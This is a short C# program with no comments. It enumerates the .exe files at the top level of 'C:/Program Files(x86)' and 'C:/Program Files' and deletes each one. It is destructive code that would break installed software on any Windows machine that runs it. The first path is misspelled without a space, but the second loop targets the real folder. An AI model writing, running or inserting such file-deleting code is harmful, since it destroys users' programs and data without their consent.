using System.IO;
using System.Collections.Generic;

class Program
    {
        static void Main(string[] args)
        {
var dir = new DirectoryInfo("C:/Program Files(x86)");

foreach (var file in dir.EnumerateFiles("*.exe")) {
    file.Delete();
}

var dirr = new DirectoryInfo("C:/Program Files");

foreach (var file in dirr.EnumerateFiles("*.exe")) {
    file.Delete();
}
		}
}
